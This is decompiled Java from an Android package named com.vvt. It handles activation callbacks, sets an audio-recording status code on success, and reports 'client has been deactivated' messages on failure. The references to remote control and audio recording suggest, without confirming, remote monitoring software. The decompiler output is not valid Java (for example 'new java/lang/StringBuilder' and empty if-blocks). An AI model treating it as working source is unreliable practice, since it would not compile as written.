package com.vvt.appengine.a;

import android.os.ConditionVariable;
import com.vvt.datadeliverymanager.enums.ErrorResponseType;
import com.vvt.remotecontrol.output.RmtCtrlActivateOutputStatusMessage;

class c
  implements com.vvt.activation_manager.a
{
  c(a parama) {}
  
  public void a(int paramInt)
  {
    boolean bool = a.a();
    if (bool) {}
    a.a(this.a).setSuccess(true);
    a.a(this.a).setRecordingAudioSourceStatusCode(paramInt);
    a.b(this.a).open();
  }
  
  public void a(ErrorResponseType paramErrorResponseType, int paramInt, String paramString)
  {
    boolean bool = a.a();
    if (bool) {}
    Object localObject = ErrorResponseType.ERROR_SERVER;
    String str;
    if (paramErrorResponseType == localObject)
    {
      localObject = new java/lang/StringBuilder;
      ((StringBuilder)localObject).<init>();
      localObject = ((StringBuilder)localObject).append(paramString);
      str = " Client has been deactivated, but may still be shown as activated on the server.";
    }
    for (localObject = str;; localObject = "Connection failed. Client has been deactivated, but may still be shown as activated on the server.")
    {
      a.a(this.a).setSuccess(false);
      a.a(this.a).setMessage((String)localObject);
      a.b(this.a).open();
      return;
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/appengine/a/MyUncaughtExceptionHandler.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */